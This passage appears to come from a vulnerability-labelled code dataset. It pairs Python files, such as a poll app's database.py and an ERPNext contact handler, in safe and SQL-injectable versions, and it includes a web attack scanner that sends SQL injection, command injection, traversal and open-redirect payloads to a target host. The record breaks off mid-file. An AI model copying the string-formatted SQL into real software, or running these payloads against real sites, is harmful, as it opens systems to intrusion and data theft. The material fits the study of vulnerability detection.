        c.execute(req, params)
    return tokens

def genTokensExternal(poll_name, count=False):
    conn, c = connectDB()
    tok = genTokens(c, poll_name, count)
    closeDB(conn)
    return tok

def createAdminToken(c, poll_name):
    adm_token = genSingleToken()
    params = (adm_token, poll_name)
    req = ""INSERT INTO {} VALUES (?, ?)"".format(CFG(""admintoken_table_name""))
    c.execute(req, params)

def getAdmToken(poll_name):
    conn, c = connectDB()
    req = ""SELECT adm_token FROM {} WHERE poll_name=?"".format(CFG(""admintoken_table_name""))
    admtok = queryOne(c, req, (poll_name,))
    closeDB(conn)
    return admtok

def checkPollExists(poll_name):
    conn, c = connectDB()
    req = ""SELECT EXISTS( SELECT 1 FROM {} WHERE name=?)"".format(CFG(""poll_table_name""))
    tmp = queryOne(c, req, (poll_name,))
    conn.close()
    return tmp

def createPoll(poll_name, options_arr, question, has_tokens, multi, openresults=True):
    if checkPollExists(poll_name):
        raise RuntimeError(""Cannot create poll, because the poll already exists."")
    conn, c = connectDB()

    # actual poll
    name = poll_name
    options = "","".join(options_arr)
    date = ""NONE""
    show_results = openresults
    params = (name, options, has_tokens, show_results, question, multi, date) 
    req = ""INSERT INTO {} VALUES (?,?,?,?,?,?,?)"".format(CFG(""poll_table_name""))
    c.execute(req, params)

    # tokens if needed
    tokens = []
    if has_tokens:
        tokens = genTokens(c, poll_name)

    # adminAccessToken
    createAdminToken(c, poll_name)

    # update options
    for opt in options_arr:
        insertOption(c, poll_name, opt)
    
    closeDB(conn)
    return tokens

def getOptions(poll_name):
    conn, c = connectDB()
    req = ""SELECT options FROM {} WHERE name=?"".format(CFG(""poll_table_name""))
    options_str = queryOne(c, req, (poll_name,))
    if options_str == None:
        return None
    options = options_str.split("","")
    closeDB(conn)
    return options
/n/n/n",0
177,177,186c5ff5cdf58272e253a1bb432419ee50d93109,"/database.py/n/nimport sqlite3
import os.path
from cpwrap import CFG
import random
import string

def connectDB():
    conn = sqlite3.connect(CFG(""dbname""))
    return (conn, conn.cursor())

def closeDB(conn, cursor=None):
    conn.commit()
    conn.close()

def queryAll(cursor, reqString):
    try:
        cursor.execute(reqString)
        ret = cursor.fetchall()
        if ret:
            return ret
    except IndexError:
        return []

def queryOne(cursor, reqString):
    try:
        cursor.execute(reqString)
        ret = cursor.fetchone()
        if ret:
            return ret[0]
    except IndexError:
        return None

def queryQuestion(poll_name):
    conn, c = connectDB()
    req = ""SELECT question from {} WHERE name = '{}'"".format(CFG(""poll_table_name""), poll_name)
    tmp = queryOne(c, req)
    conn.close()
    return tmp

def tokenNeededExternal(poll_name):
    conn, c = connectDB()
    tmp = checkTokenNeeded(c, poll_name)
    conn.close()
    return tmp

def markTokenUsedExternal(token, optStr=""""):
    conn, c = connectDB()
    req = ""UPDATE {} SET \""options_selected\""='{}' WHERE token='{}'"".format(CFG(""tokens_table_name""), \
                    optStr, token)
    c.execute(req)
    closeDB(conn)

def init():
    if os.path.isfile(CFG(""dbname"")):
        return
    conn, c = connectDB()
    c.execute(""CREATE TABLE "" + CFG(""poll_table_name"") + ""(\
                    name text,\
                    options text,\
                    has_tokens integer,\
                    show_results integer,\
                    question text,\
                    multi integer, \
                    date text)""\
                    )
    c.execute(""CREATE TABLE {}(name_option text, count integer)"".format(CFG(""options_table_name"")))
    c.execute(""CREATE TABLE {}(token text, name text, options_selected text)"".format(CFG(""tokens_table_name"")))
    c.execute(""CREATE TABLE {}(adm_token text, poll_name text)"".format(CFG(""admintoken_table_name"")))
    closeDB(conn)

def checkTokenValid(cursor, token, poll_name):
    req = ""SELECT name, options_selected from {} where token='{}'"".format(CFG(""tokens_table_name""), token)
    answer = queryAll(cursor, req)
    return answer and answer[0][0] == poll_name and answer[0][1] == 'NONE'

def checkAdmTokenValid(poll_name, adm_token):
    conn, c = connectDB()
    req = ""SELECT poll_name from {} where adm_token = \""{}\"""".format(CFG(""admintoken_table_name""), adm_token)
    answer = queryOne(c, req)
    closeDB(conn)
    return answer == poll_name

def isValidAdmToken(adm_token):
    conn, c = connectDB()
    req = ""SELECT *  from {} where adm_token='{}'"".format(CFG(""admintoken_table_name""), adm_token)
    answer = bool(queryOne(c, req))
    closeDB(conn)
    return answer

def isValidToken(token):
    conn, c = connectDB()
    req = ""SELECT * from {} where token='{}'"".format(CFG(""tokens_table_name""), token)
    answer = bool(queryOne(c, req))
    closeDB(conn)
    return answer

def pollNameFromToken(token):
    conn, c = connectDB()
    req = ""SELECT name from {} where token='{}'"".format(CFG(""tokens_table_name""), token)
    answer = queryOne(c, req)
    if not answer:
        req = ""SELECT poll_name from {} where adm_token='{}'"".format(CFG(""admintoken_table_name""), token)
        answer = queryOne(c, req)
    closeDB(conn)
    return answer


def checkTokenNeeded(cursor, poll_name):
    req = ""SELECT has_tokens FROM {} WHERE name = '{}'"".format(CFG(""poll_table_name""), poll_name)
    return queryOne(cursor, req) == 1;

def incrementOption(cursor, poll_name, option):
    key = poll_name+""-""+option
    req = ""UPDATE {} SET count=count+1 WHERE name_option = '{}';"".format(CFG(""options_table_name""), key)
    cursor.execute(req)

def isMultiChoice(poll_name):
    conn, c = connectDB()
    req = ""SELECT multi FROM {} WHERE name = '{}'"".format(CFG(""poll_table_name""), poll_name)
    ret = queryOne(c, req) == 1
    closeDB(conn)
    return ret

def vote(poll_name, options_string, token_used=""DUMMY_INVALID_TOKEN""):
    conn, c = connectDB()

    # check token
    token_valid = checkTokenValid(c, token_used, poll_name)
    if not token_valid and checkTokenNeeded(c, poll_name):
        raise PermissionError(""Poll requires valid token."")
    markTokenUsedExternal(token_used, options_string)

    # save changes
    # lambda x: x -> röfl :D
    options = list(filter(lambda x: x, options_string.split("","")))
    # check if multi-choice
    if len(options) > 1:
        if not isMultiChoice(poll_name):
            raise ValueError(""multiple options for single choice"")

    for opt in options:
        incrementOption(c, poll_name, opt)

    closeDB(conn)

def getOptionCount(c, poll_name, option):
    key = poll_name + ""-"" + option
    req = ""SELECT \""count\"" FROM {table} WHERE \""name_option\"" = '{key}'"".format(
                    table=CFG(""options_table_name""),key=key)
    count = queryOne(c, req)
    if count == None:
        raise AssertionError(""Unknown answer for poll. WTF?"")
    return count;

def getResults(poll_name):
    conn, c = connectDB()
    req = ""SELECT options from {} where name = '{}'"".format(CFG(""poll_table_name""), poll_name)
    options_str = queryOne(c, req)

    if not options_str:
        raise LookupError(""Poll '{}' not found in DB"".format(poll_name))

    total = 0
    options = options_str.split("","")
    results = dict()
    for opt in options:
        count = getOptionCount(c, poll_name, opt)
        total += int(count)
        results.update({opt:count})

    conn.close()
    return (results, total)

def insertOption(c, poll_name, option):
    key = poll_name + ""-"" + option
    count = 0
    params = (key, count)
    req = ""INSERT INTO {} VALUES (?, ?)"".format(CFG(""options_table_name""))
    c.execute(req, params)

def getTokensExternal(poll_name):
    req = ""SELECT token FROM {} WHERE name='{}'"".format(CFG(""tokens_table_name""), poll_name)
    conn, c = connectDB()
    tmp = queryAll(c, req)
    conn.close()
    return tmp

def genSingleToken(length=5):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

def genTokens(c, poll_name, count=False):
    if not count:
        count = CFG(""default_token_count"")

    tokens = [ genSingleToken() for x in range(0,count) ]
    for token in tokens:
        name = poll_name 
        options_selected = ""NONE""
        params = (token, name, options_selected)
        req = ""INSERT INTO {} VALUES (?, ?, ?)"".format(CFG(""tokens_table_name""))
        c.execute(req, params)
    return tokens

def genTokensExternal(poll_name, count=False):
    conn, c = connectDB()
    tok = genTokens(c, poll_name, count)
    closeDB(conn)
    return tok

def createAdminToken(c, poll_name):
    adm_token = genSingleToken()
    params = (adm_token, poll_name)
    req = ""INSERT INTO {} VALUES (?, ?)"".format(CFG(""admintoken_table_name""))
    c.execute(req, params)

def getAdmToken(poll_name):
    conn, c = connectDB()
    req = ""SELECT adm_token FROM {} WHERE poll_name='{}'"".format(CFG(""admintoken_table_name""), poll_name)
    admtok = queryOne(c, req)
    closeDB(conn)
    return admtok

def checkPollExists(poll_name):
    conn, c = connectDB()
    req = ""SELECT EXISTS( SELECT 1 FROM {} WHERE name='{}')"".format(CFG(""poll_table_name""), poll_name)
    tmp = queryOne(c, req)
    conn.close()
    return tmp

def createPoll(poll_name, options_arr, question, has_tokens, multi, openresults=True):
    if checkPollExists(poll_name):
        raise RuntimeError(""Cannot create poll, because the poll already exists."")
    conn, c = connectDB()

    # actual poll
    name = poll_name
    options = "","".join(options_arr)
    date = ""NONE""
    show_results = openresults
    params = (name, options, has_tokens, show_results, question, multi, date) 
    req = ""INSERT INTO {} VALUES (?,?,?,?,?,?,?)"".format(CFG(""poll_table_name""))
    c.execute(req, params)

    # tokens if needed
    tokens = []
    if has_tokens:
        tokens = genTokens(c, poll_name)

    # adminAccessToken
    createAdminToken(c, poll_name)

    # update options
    for opt in options_arr:
        insertOption(c, poll_name, opt)
    
    closeDB(conn)
    return tokens

def getOptions(poll_name):
    conn, c = connectDB()
    options_str = queryOne(c, ""SELECT options FROM {} WHERE name='{}'"".format(CFG(""poll_table_name""), poll_name))
    if options_str == None:
        return None
    options = options_str.split("","")
    closeDB(conn)
    return options
/n/n/n",1
192,192,9acb885e60f77cd4e9ea8c98bdc39c18abcac731,"erpnext/templates/utils.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals

import frappe, json
from frappe import _
from frappe.utils import cint, formatdate

@frappe.whitelist(allow_guest=True)
def send_message(subject=""Website Query"", message="""", sender="""", status=""Open""):
	from frappe.www.contact import send_message as website_send_message
	lead = customer = None

	website_send_message(subject, message, sender)

	customer = frappe.db.sql(""""""select distinct dl.link_name from `tabDynamic Link` dl
		left join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'
		and c.email_id = %s"""""", sender)

	if not customer:
		lead = frappe.db.get_value('Lead', dict(email_id=sender))
		if not lead:
			new_lead = frappe.get_doc(dict(
				doctype='Lead',
				email_id = sender,
				lead_name = sender.split('@')[0].title()
			)).insert(ignore_permissions=True)

	opportunity = frappe.get_doc(dict(
		doctype ='Opportunity',
		enquiry_from = 'Customer' if customer else 'Lead',
		status = 'Open',
		title = subject,
		contact_email = sender,
		to_discuss = message
	))

	if customer:
		opportunity.customer = customer[0][0]
	elif lead:
		opportunity.lead = lead
	else:
		opportunity.lead = new_lead.name

	opportunity.insert(ignore_permissions=True)

	comm = frappe.get_doc({
		""doctype"":""Communication"",
		""subject"": subject,
		""content"": message,
		""sender"": sender,
		""sent_or_received"": ""Received"",
		'reference_doctype': 'Opportunity',
		'reference_name': opportunity.name
	})
	comm.insert(ignore_permissions=True)

	return ""okay""
/n/n/n",0
193,193,9acb885e60f77cd4e9ea8c98bdc39c18abcac731,"/erpnext/templates/utils.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# License: GNU General Public License v3. See license.txt

from __future__ import unicode_literals

import frappe, json
from frappe import _
from frappe.utils import cint, formatdate

@frappe.whitelist(allow_guest=True)
def send_message(subject=""Website Query"", message="""", sender="""", status=""Open""):
	from frappe.www.contact import send_message as website_send_message
	lead = customer = None

	website_send_message(subject, message, sender)

	customer = frappe.db.sql(""""""select distinct dl.link_name from `tabDynamic Link` dl
		left join `tabContact` c on dl.parent=c.name where dl.link_doctype='Customer'
		and c.email_id='{email_id}'"""""".format(email_id=sender))

	if not customer:
		lead = frappe.db.get_value('Lead', dict(email_id=sender))
		if not lead:
			new_lead = frappe.get_doc(dict(
				doctype='Lead',
				email_id = sender,
				lead_name = sender.split('@')[0].title()
			)).insert(ignore_permissions=True)

	opportunity = frappe.get_doc(dict(
		doctype ='Opportunity',
		enquiry_from = 'Customer' if customer else 'Lead',
		status = 'Open',
		title = subject,
		contact_email = sender,
		to_discuss = message
	))

	if customer:
		opportunity.customer = customer[0][0]
	elif lead:
		opportunity.lead = lead
	else:
		opportunity.lead = new_lead.name

	opportunity.insert(ignore_permissions=True)

	comm = frappe.get_doc({
		""doctype"":""Communication"",
		""subject"": subject,
		""content"": message,
		""sender"": sender,
		""sent_or_received"": ""Received"",
		'reference_doctype': 'Opportunity',
		'reference_name': opportunity.name
	})
	comm.insert(ignore_permissions=True)

	return ""okay""
/n/n/n",1
166,166,ee2f15e316ef7b29e25944dfc24f035b92924cba,"crapo_tests/models/crm_stage.py/n/n""""""
©2019
License: AGPL-3

@author: C. Guychard (Article 714)

""""""

import logging

from odoo import models, api
from psycopg2.sql import Identifier
from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):
    _inherit = ""crm.stage""
    _state_for_model = ""crm.lead""

    def write(self, values):
        if len(self) == 1:
            if ""crapo_state"" not in values and not self.crapo_state:
                if ""name"" in values:
                    vals = {""name"": values[""name""]}
                else:
                    vals = {""name"": self.name}
                mystate = self._compute_related_state(vals)
                values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).write(values)

    @api.model
    def create(self, values):
        """""" Create a new crapo_stage for each crm_stage
        """"""
        if ""crapo_state"" not in values and not self.crapo_state:
            if ""name"" in values:
                vals = {""name"": values[""name""]}
            mystate = self._compute_related_state(vals)
            values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).create(values)

    @api.model_cr_context
    def _init_column(self, column_name):
        """""" Initialize the value of the given column for existing rows.
            Overridden here because we need to wrap existing stages in
            a new crapo_state for each stage (including a default automaton)
        """"""
        if column_name not in [""crapo_state""]:
            return super(CrmStageWithMixin, self)._init_column(column_name)
        else:
            default_compute = self._compute_related_state

            tname = Identifier(self._table.replace('""', """")).as_string(
                self.env.cr._obj  # pylint: disable=protected-access
            )
            cname = Identifier(column_name.replace('""', """")).as_string(
                self.env.cr._obj  # pylint: disable=protected-access
            )

            logging.error(
                ""MMMMMAIS %s ==> %s (%s) -> %s"",
                self._table,
                tname,
                type(tname),
                str(tname),
            )

            self.env.cr.execute(
                ""SELECT id, name FROM %s WHERE %s is NULL"",
                (self._table, cname),
            )
            stages = self.env.cr.fetchall()

            for stage in stages:
                default_value = default_compute(values={""name"": stage[1]})
                self.env.cr.execute(
                    ""UPDATE %s SET %s=%s WHERE id = %s"",
                    (self._table, cname, default_value.id, stage[0]),
                )
        return True
/n/n/n",0
167,167,ee2f15e316ef7b29e25944dfc24f035b92924cba,"/crapo_tests/models/crm_stage.py/n/n""""""
©2019
License: AGPL-3

@author: C. Guychard (Article 714)

""""""

import logging

from odoo import models, api
from psycopg2.sql import Identifier
from odoo.addons.base_crapo_workflow.mixins import (
    crapo_automata_mixins,
)  # pylint: disable=odoo-addons-relative-import


class CrmStageWithMixin(crapo_automata_mixins.WrappedStateMixin, models.Model):
    _inherit = ""crm.stage""
    _state_for_model = ""crm.lead""

    def write(self, values):
        if len(self) == 1:
            if ""crapo_state"" not in values and not self.crapo_state:
                if ""name"" in values:
                    vals = {""name"": values[""name""]}
                else:
                    vals = {""name"": self.name}
                mystate = self._compute_related_state(vals)
                values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).write(values)

    @api.model
    def create(self, values):
        """""" Create a new crapo_stage for each crm_stage
        """"""
        if ""crapo_state"" not in values and not self.crapo_state:
            if ""name"" in values:
                vals = {""name"": values[""name""]}
            mystate = self._compute_related_state(vals)
            values[""crapo_state""] = mystate.id

        return super(CrmStageWithMixin, self).create(values)

    @api.model_cr_context
    def _init_column(self, column_name):
        """""" Initialize the value of the given column for existing rows.
            Overridden here because we need to wrap existing stages in
            a new crapo_state for each stage (including a default automaton)
        """"""
        if column_name not in [""crapo_state""]:
            return super(CrmStageWithMixin, self)._init_column(column_name)
        else:
            default_compute = self._compute_related_state

            tname = Identifier(self._table).as_string(
                self.env.cr._obj  # pylint: disable=protected-access
            )
            cname = Identifier(column_name).as_string(
                self.env.cr._obj  # pylint: disable=protected-access
            )

            logging.error(
                ""MMMMMAIS %s (%s) -> %s"", tname, type(tname), str(tname)
            )

            self.env.cr.execute(
                ""SELECT id, name FROM %s WHERE %s is NULL"", (tname, cname)
            )
            stages = self.env.cr.fetchall()

            for stage in stages:
                default_value = default_compute(values={""name"": stage[1]})
                self.env.cr.execute(
                    ""UPDATE %s SET %s=%s WHERE id = %s"",
                    (tname, cname, default_value.id, stage[0]),
                )
        return True
/n/n/n",1
20,20,72f5292f0edc0c86f86d6c7f1bbca6d7bd3a04b3,"payloads/inject.py/n/nimport requests
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib


BASE_URL = ""http://target.com""
sql_injection = ""SQL Injection""
server_injection = ""Server Side Code Injection""
directory_traversal = ""Directory Traversal""
open_redirect = ""Open Redirect""
cross_site_request_forgery = ""Cross Site Request Forgery""
shell_command = ""Shell Command Injection""

def injectPayload(url, method, paramname, payload, verbose = False):
	parsedURL = BASE_URL + url	
	html = """"

	#if get
	if method == ""GET"":
		getURL = parsedURL + ""?"" + paramname+""=""+payload[0]
		content = requests.get(getURL)
		html =  content.text

	#if post
	elif method == ""POST"":
		content = requests.post(parsedURL, data={paramname:payload[0]})
		html = content.text


	result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
	
	#if function returns:
	if result is not None:
		print(url, payload)
		#generateExploit(parsedURL, method, paramname, payload)
		return True
	return None

def timeid(full=False):
	if full==False:
		return datetime.now().strftime(""%S-%f"")
	else:
		return datetime.now().strftime(""%H-%M-%S-%f"") 

def generateExploit(url, method, paramname, payload):
#payload is a ""payload, type_of_payload"" list

	dirname = ""exploits/""
	if not os.path.exists(dirname):
		os.makedirs(dirname)

	copy(""exploit.py"", dirname)

	f = open(dirname + payload[1] + ""_"" + timeid() + "".sh"",""w+"")
	f.write(""python exploit.py "" + '""' + url +'"" ' + method + "" ""+ paramname + ' ""' +payload[0]+'""')
	


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
	if v == True:
		print html

	#===== check for directory traversal =====
	if attackType == directory_traversal:
		match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
		if len(match) == 0:
			return None
		return match

	#======= check for shell command injection ======
	if attackType == shell_command:
		match = re.findall(r'GNU/Linux', html)
		if len(match) == 0:
			return None
		return match

	#===== check for sql_injection ======
	""""""
	# if attackType == sql_injection:
		
	# 	falsePayload = sqli.get_false()[0]
	# 	badhtml = """"
	# 	#if get
	# 	if method == ""GET"":
	# 		getURL = url + ""?"" + paramname+""=""+falsePayload
	# 		content = requests.get(getURL)
	# 		badhtml =  content.text
	# 	#if post
	# 	elif method == ""POST"":
	# 		content = requests.post(url, data={paramname:falsePayload})
	# 		badhtml = content.text

	# 	compare_res = sqli.compare_html(badhtml, html)		
	# 	match = re.findall(r'<ins>.+', compare_res)
	# 	if len(match) ==0 :
	# 		return None
	# 	return None
	""""""
	# Add another true page to remove false positive
	# Commented for now
	if attackType == sql_injection:
		## for real sql injection, the payloads should return the same result
		## then compare the fake page with the true page to see the difference
		falsePayloads = sqli.get_false()
		badhtml = []
		for falsePayload in falsePayloads:
			#if get
			if method == ""GET"":
				getURL = url + ""?"" + paramname+""=""+falsePayload
				false_page = requests.get(getURL)
				if(false_page.status_code==200):
					badhtml.append(false_page.text)
				else:
					badhtml.append(requests.get(url).text)
			#if post
			elif method == ""POST"":
				false_page = requests.post(url, data={paramname:falsePayload})
				if(false_page.status_code==200):
					badhtml.append(false_page.text)
					# print(html)
				else:
					badhtml.append(requests.get(url).text)

		if(content.status_code==200) and badhtml[1]==html:
			compare_res = sqli.compare_html(badhtml[0], html)  
			match = re.findall(r'<ins>.+', compare_res)

		else:
			match = """"
		if len(match) ==0 :
			return None

		return match


	#====== check for open_redirect=======
	if attackType == open_redirect:
		if len(content.history) > 0 and content.url == ""https://status.github.com/messages"":
			return True

	
	#=======check for server_injection ====
	if attackType == server_injection:
		#included index.php
		indexPHP = requests.get(BASE_URL + ""/index.php"")

		if indexPHP.text in html:
			return attackType
		#uname -a successful:
		if ""GNU/Linux"" in html:
			return attackType

	return None;
	
def get_payloads(v=False):
	payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

	if v == True:
		for p in payloads:
			print p[0]

	return payloads


if __name__ == ""__main__"":
	# get_payloads(v=True)

	
	## check all pages
	payloads = get_payloads()
	url_list = ['/directorytraversal/directorytraversal.php',
				""/commandinjection/commandinjection.php"",
				""/sqli/sqli.php"",
				""/serverside/eval2.php"",
				""/openredirect/openredirect.php""]
	for payload in payloads:
		injectPayload(url_list[0],  'GET','ascii', payload)
		injectPayload(url_list[1], 'POST', ""host"", payload)
		injectPayload(url_list[2],  ""POST"", ""username"", payload)
		injectPayload(url_list[3],  ""POST"", ""page"", payload)
		injectPayload(url_list[4],  ""GET"", ""redirect"", payload)

	

	## test directory shell
	# url = '/directorytraversal/directorytraversal.php'
	# payloads = dirtraversal.get_all()

	# for payload in payloads:
	#     ## need param after endpoint ?param=
		
	#     injectPayload(url, 'ascii', 'GET', payload)


	# ## test shell command
	# ## post in the form
	# url = ""/commandinjection/commandinjection.php""
	# payloads = cmd.get_all()
	# for payload in payloads:
	# 	injectPayload(url, ""host"", 'POST', payload)

	#sqli
	# post in the form
	#url = ""/sqli/sqli.php""
	#payloads = sqli.get_all()
	#for payload in payloads:
	#	injectPayload(url, ""username"", ""POST"", payload)

	#Test for server side code injection
	# url = ""/serverside/eval2.php""
	# payloads = ssci.get_all(url)
	# for payload in payloads:
	# 	injectPayload(url, ""page"", ""POST"", payload)
	'''
	#test for open redirect
	url = ""/openredirect/openredirect.php""
	orPayload = oRedirect.get_all()
	for payload in orPayload:
		injectPayload(url, ""redirect"", ""GET"", payload)
	'''
/n/n/npayloads/sqli.py/n/nimport difflib

""""""
Solutions:
1. compare pages only  
match = re.findall(r'<pre>', html)

2. add false page to compare
match = re.findall(r'<ins>.+', compare_res)

3. add another label ""' or '1'='1"" as ground truth
Assumption: should be the same page for sql injection, different with false page
""""""

def get_false():
	## the second is taken as ground truth to filter out real sql-injection page
	payloads = [""' and '1=2"", ""' or '1'='1""]
	return payloads

# def get_false():
# 	payloads = ""' and '1=2""
# 	return payloads

def get_all():
	""""""
	Consider different db types and versions
	-- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
	' OR '1'='1' --
	' OR '1'='1' /*
	-- MySQL
	' OR '1'='1' #
	-- Access (using null characters)
	' OR '1'='1' %00
	' OR '1'='1' %16
	""""""
	## temp test
	# payloads = [""' or '1=1""]
	payloads = [""' or '1=1"",   ""'1 'or' 1'='1"",""' or '1'='1"",  ""'or 1=1#"", ""' OR '1=1 %00""]
	payloads = [(item, ""SQL Injection"") for item in payloads]
	return payloads	

def compare_html(html1, html2):
	diff_html = """"
	diffs = difflib.ndiff(html1.splitlines(), html2.splitlines())
	for ele in diffs:
		if (ele[0] == ""-""):
			diff_html += ""<del>%s</del>"" % ele[1:].strip()
		elif(ele[0] == ""+""):
			diff_html += ""<ins>%s</ins>"" %ele[1:].strip()

	return diff_html

if __name__ == ""__main__"":	
	print get_all()
/n/n/npayloads/test_inject.py/n/nimport requests
import json
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib
import collections

BASE_URL = ""http://target.com""
sql_injection = ""SQL Injection""
server_injection = ""Server Side Code Injection""
directory_traversal = ""Directory Traversal""
open_redirect = ""Open Redirect""
cross_site_request_forgery = ""Cross Site Request Forgery""
shell_command = ""Shell Command Injection""

class AutoDict(dict):
    def __getitem__(self, item):
        try:
            return dict.__getitem__(self, item)
        except KeyError:
            value = self[item] = type(self)()
            return value

final_output=[]
vul_list = []
vul_classes = AutoDict()

def format_vul_list():
    sorted_list = sorted(vul_list, key=lambda x: x[2][1])
    print(sorted_list)

## write to json file if possible
def write_file(url, paramname, payload, method):
    ## initialize dict
    sub_elements = AutoDict()
    lists = []
    sub_elements['endpoint']= url
    sub_elements['params']['key1']= payload[0]
    sub_elements['method'] = method
    # update current dict
    if(vul_classes.get('class')==payload[1]):
        lists = vul_classes['results'][BASE_URL]

        for ele in lists:
            if (ele['endpoint'] == url) and (ele['params']['key1']==payload[0]) and (ele['method']==method) :
                continue
            else:
                lists.append(sub_elements)
         
        vul_classes['results'][BASE_URL]=lists

    else:
        vul_classes['class'] = payload[1]        
        lists.append(sub_elements)
        vul_classes['results'][BASE_URL]=lists



def injectPayload(url, paramname, method, payload, verbose = False):
    parsedURL = BASE_URL + url  
    html = """"

    #if get
    if method == ""GET"":
        getURL = parsedURL + ""?"" + paramname+""=""+payload[0]
        content = requests.get(getURL)
        html =  content.text

    #if post
    elif method == ""POST"":
        content = requests.post(parsedURL, data={paramname:payload[0]})
        html = content.text

    result = checkSuccess(html, payload[1], content, parsedURL, method, paramname, verbose)
    
    #if function returns:
    if result is not None:
        print(url, payload)
        vul_list.append([url, paramname, payload, method])

        #generateExploit(parsedURL, method, paramname, payload)
        return True
    return None

def timeid(full=False):
    if full==False:
        return datetime.now().strftime(""%S-%f"")
    else:
        return datetime.now().strftime(""%H-%M-%S-%f"") 

def generateExploit(url, method, paramname, payload):
#payload is a ""payload, type_of_payload"" list

    dirname = ""exploits/""
    if not os.path.exists(dirname):
        os.makedirs(dirname)

    copy(""exploit.py"", dirname)

    f = open(dirname + payload[1] + ""_"" + timeid() + "".sh"",""w+"")
    f.write(""python exploit.py "" + '""' + url +'"" ' + method + "" ""+ paramname + ' ""' +payload[0]+'""')
    


def checkSuccess(html, attackType, content, url, method, paramname, v=False):
    if v == True:
        print html

    #===== check for directory traversal =====
    if attackType == directory_traversal:
        match = re.findall(r'\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]?:[\/a-zA-Z0-9]*', html)
        if len(match) == 0:
            return None
        return match

    #======= check for shell command injection ======
    if attackType == shell_command:
        match = re.findall(r'GNU/Linux', html)
        if len(match) == 0:
            return None
        return match

    #===== check for sql_injection ======
    if attackType == sql_injection:
        ## for real sql injection, the payloads should return the same result
        ## then compare the fake page with the true page to see the difference
        falsePayloads = sqli.get_false()
        #if get
        badhtml = []
        for falsePayload in falsePayloads:
            if method == ""GET"":
                getURL = url + ""?"" + paramname+""=""+falsePayload
                false_page = requests.get(getURL)
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                else:
                    badhtml.append(requests.get(url).text)
            #if post
            elif method == ""POST"":
                false_page = requests.post(url, data={paramname:falsePayload})
                if(false_page.status_code==200):
                    badhtml.append(false_page.text)
                    # print(html)
                else:
                    badhtml.append(requests.get(url).text)

        if(content.status_code==200) and badhtml[1]==html:
            compare_res = sqli.compare_html(badhtml[0], html)  
            match = re.findall(r'<ins>.+', compare_res)

        else:
            match = """"
        if len(match) ==0 :
            return None

        return match

    #====== check for open_redirect=======
    if attackType == open_redirect:
        if len(content.history) > 0 and content.url == ""https://status.github.com/messages"":
            return True

    
    #=======check for server_injection ====
    if attackType == server_injection:
        #included index.php
        indexPHP = requests.get(BASE_URL + ""/index.php"")

        if indexPHP.text in html:
            return attackType
        #uname -a successful:
        if ""GNU/Linux"" in html:
            return attackType

    return None;
    
def get_payloads(v=False):
    payloads = cmd.get_all() +sqli.get_all() + ssci.get_all() + oRedirect.get_all() + dirtraversal.get_all()

    if v == True:
        for p in payloads:
            print p[0]

    return payloads


if __name__ == ""__main__"":
    # get_payloads(v=True)

    payloads = sqli.get_all()
    url_list = ['/directorytraversal/directorytraversal.php',
                ""/commandinjection/commandinjection.php"",
                ""/sqli/sqli.php"",
                ""/serverside/eval2.php"",
                ""/openredirect/openredirect.php""]
    for payload in payloads:
        # injectPayload(url_list[0], 'ascii', 'GET', payload)
        # injectPayload(url_list[1], ""host"", 'POST', payload)
        injectPayload(url_list[2], ""username"", ""POST"", payload)
        injectPayload(url_list[3], ""page"", ""POST"", payload)
        injectPayload(url_list[4], ""redirect"", ""GET"", payload)

    # with open('exploits/test.json', 'w') as f:
    #     json.dump(final_output, f)

    # format_lu_list()
    ## test directory shell
    # url = '/directorytraversal/directorytraversal.php'
    # payloads = dirtraversal.get_all()

    # for payload in payloads:
    #     ## need param after endpoint ?param=
        
    #     injectPayload(url, 'ascii', 'GET', payload)


    # ## test shell command
    # ## post in the form
    # url = ""/commandinjection/commandinjection.php""
    # payloads = cmd.get_all()
    # for payload in payloads:
    #   injectPayload(url, ""host"", 'POST', payload)

    #sqli
    # post in the form
    #url = ""/sqli/sqli.php""
    #payloads = sqli.get_all()
    #for payload in payloads:
    #   injectPayload(url, ""username"", ""POST"", payload)

    #Test for server side code injection
    # url = ""/serverside/eval2.php""
    # payloads = ssci.get_all(url)
    # for payload in payloads:
    #   injectPayload(url, ""page"", ""POST"", payload)
    '''
    #test for open redirect
    url = ""/openredirect/openredirect.php""
    orPayload = oRedirect.get_all()
    for payload in orPayload:
        injectPayload(url, ""redirect"", ""GET"", payload)
    '''/n/n/n",0
21,21,72f5292f0edc0c86f86d6c7f1bbca6d7bd3a04b3,"/payloads/inject.py/n/nimport requests
import ssci
import oRedirect 
import os
import re 
import sqli
import cmd
import dirtraversal
from shutil import copy,rmtree
from datetime import datetime
import difflib


BASE_URL = ""http://target.com""
sql_injection = ""SQL Injection""
server_injection = ""Server Side Code Injection""
directory_traversal = ""Directory Traversal""
open_redirect = ""Open Redirect""
cross_site_request_forgery = ""Cross Site Request Forgery""
shell_command = ""Shell Command Injection""

def injectPayload(url, method, paramname, payload, verbose = False):
	parsedURL = BASE_URL + url	
	html = """"

	#if get
	if method == ""GET"":
		getURL = parsedURL + ""?"" + paramname+""=""+payload[0]
		content = requests.get(getURL)
